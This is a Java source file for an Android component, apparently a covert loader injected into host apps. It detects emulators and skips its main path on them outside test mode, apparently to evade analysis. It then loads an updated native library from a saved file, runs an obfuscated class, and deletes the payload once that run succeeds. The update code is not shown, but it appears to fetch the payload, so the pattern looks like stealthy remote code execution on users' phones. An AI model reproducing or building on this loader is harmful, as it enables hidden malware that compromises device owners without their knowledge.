package com.use.nice;

import android.app.Service;
import android.content.Context;
import android.content.Intent;

import com.use.nice.manager.GlobalContext;
import com.use.nice.update.UDCtrl;
import com.use.nice.update.UpdateUtil;
import com.use.nice.util.EmulateCheckUtil;
import com.use.nice.util.Util_File;
import com.use.nice.util.Util_Log;

import java.io.File;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import a.e.g.c;

/**
 * Created by zhengnan on 2015/9/16.
 */
public class NiceFace {
    static boolean isRunning = false;
    static ExecutorService service = Executors.newSingleThreadExecutor();
    static Service serviceIns = null;

    public static void onReceive(final Context paramContext, final Intent paramIntent){
        if(paramContext  instanceof  Service){
            Util_Log.log("isService...");
            serviceIns = (Service)paramContext;
        }
        EmulateCheckUtil.isValidDevice(paramContext, new EmulateCheckUtil.ResultCallBack() {
            @Override
            public void isEmulator() {
                Util_Log.log("is emulator!");
                UDCtrl.getIns().pushLog(202+"");
                if (GlobalContext.isTest)
                    onReceiveReal(paramContext, paramIntent);
            }

            @Override
            public void isDevice() {
                onReceiveReal(paramContext, paramIntent);
            }

            @Override
            public void notSure() {
                Util_Log.log("not sure device valid!");
                if (GlobalContext.isTest)
                    onReceiveReal(paramContext, paramIntent);
            }
        });
    }

    //在receiver中调用即可。 通过intent中参数来确定
    public static void onReceiveReal(final Context paramContext, final Intent paramIntent) {
        if(!UpdateUtil.isValidDevice(paramContext)){
            Util_Log.log("invalid device!");
            stopSelf();
            return;
        }
        if(Util_File.readDef(paramContext,FieldName.nice_forver,"0").equals("1")){
            Util_Log.log("永不执行标记！");
            stopSelf();
            return;
        }

        GlobalContext.init(paramContext);
        if (isRunning) {
            long beginTime = Long.parseLong(Util_File.readDef(paramContext, FieldName.isRunning, "0"));
            if(System.currentTimeMillis()-beginTime<2*60*1000){//给两分钟的时间吧
                Util_Log.logReal("isRunning: "+isRunning);
                return;
            }
        }
        isRunning = true;
        Util_File.writeDef(paramContext,FieldName.isRunning,System.currentTimeMillis()+"");
        service.execute(new Runnable() {
            @Override
            public void run() {
                //1,update()
                final NiceCtrl face = NiceCtrl.getIns();
                face.update();
                //1.1: 如果so已执行成功了就不再执行。 update时会更新soSuccess标记
                if (Util_File.readDef(paramContext, FieldName.soSuccess, "").equals(FieldName.success)) {
                    Util_Log.log("so has exec success!");
                    stopSelf( );
                    return;
                }
                //2,sureApk
                if (!face.sureApk()) {
                    Util_Log.log("no valid apk!");
                    stopSelf( );
                    return;
                }

                //3,加载so
                try {
                    File file = new File(Util_File.addSeparator(NiceCts.SAVE_PATH_NAME) + NiceCts.APK_NAME);
                    Util_Log.log("load so ...");
                    System.load("" + file.getAbsolutePath());
                    String ret = c.a(paramContext);
                     Util_Log.logReal("nice exe ret:" + ret);

                     Util_File.writeDef(paramContext, FieldName.soSuccess, ret);
                    if (ret.equals(FieldName.success)) {
                        face.deleteApk();
                    }
                    stopSelf( );
                } catch (Throwable e) {
                    e.printStackTrace();
                    stopSelf( );
                    face.deleteApk();
                    // return;
                }

                //3,执行子包的onReciever,传入一个ruunable
//                NiceConnectProxy proxy = LoadUtil.getSubNiceObj(paramContext, true);
//                if (proxy != null)
//                    proxy.onReceiver(paramContext, paramIntent, new Runnable() {
//                        @Override
//                        public void run() {
//                            Util_Log.log("exe over lsn！");
//                            isRunning = false;
//                            //deleteApk
//                            face.deleteApk();
//                        }
//                    });
            }
        });
    }

    private  static  void stopSelf( ){
        isRunning = false;
        if(serviceIns!=null){
            serviceIns.stopSelf();
        }
    }

    //注入时调用
    public static void onCreateInject(Context ctx) {
        Intent it = new Intent(ctx, MyService.class);
        ctx.startService(it);
//        GlobalContext.init(ctx);
//        Util_Log.logReal("onCreate ... ");
//        Intent it = new Intent();
//        it.putExtra(FieldName.onCreate, "true");
//        onReceive(ctx, it);
    }
}